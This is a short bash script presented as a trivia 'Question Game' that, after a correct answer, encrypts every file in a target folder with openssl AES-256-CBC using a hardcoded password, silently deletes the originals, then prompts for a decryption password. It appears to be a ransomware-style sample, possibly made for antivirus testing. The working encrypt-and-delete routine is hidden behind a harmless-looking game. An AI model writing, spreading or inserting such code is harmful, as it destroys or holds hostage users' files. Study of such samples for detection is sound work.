#!/bin/bash

# Prompt the user with a question game
echo "Welcome to the Question Game!"
echo "Answer the following question to proceed."
echo

# Define your question here
question="What is the capital of France?"
correct_answer="Paris"

# Ask the question and read the user's answer
read -p "$question: " user_answer

# Check if the user's answer is correct
if [ "$user_answer" != "$correct_answer" ]; then
    echo "Incorrect answer. Access denied."
    exit 1
fi

echo "Correct! Access granted. Pleas wait for next game."

# Continue with file encryption
folder_to_encrypt="/home/kali/Masaüstü/clam"
password="hydradragonantivirushere"

if [ ! -d "$folder_to_encrypt" ]; then
    echo "The specified folder does not exist."
    exit 1
fi

encrypt_files() {
    local file="$1"
    # Encrypt the file using AES-256-CBC encryption
    openssl enc -aes-256-cbc -in "$file" -out "$file.enc" -pass "pass:$password" > /dev/null 2>&1
    # Remove the original file, suppressing errors
    rm "$file" > /dev/null 2>&1
}

export -f encrypt_files

find "$folder_to_encrypt" -type f -print0 | xargs -0 -n 1 -P $(nproc) bash -c 'encrypt_files "$0"'

echo "All files have been encrypted, and unencrypted files have been deleted."

# Prompt the user for the decryption password
read -s -p "Enter the decryption password: " decryption_password
echo

decrypt_files() {
    local encrypted_file="$1"
    local original_file="${encrypted_file%.enc}"  # Remove the .enc extension

    # Decrypt the file using AES-256-CBC
    openssl enc -aes-256-cbc -d -in "$encrypted_file" -out "$original_file" -pass "pass:$decryption_password" > /dev/null 2>&1
    # Remove the encrypted file
    rm "$encrypted_file" > /dev/null 2>&1
}

export -f decrypt_files

find "$folder_to_encrypt" -type f -name "*.enc" -print0 | xargs -0 -n 1 -P $(nproc) bash -c 'decrypt_files "$0"'

echo "All files have been decrypted, and encrypted files have been deleted."
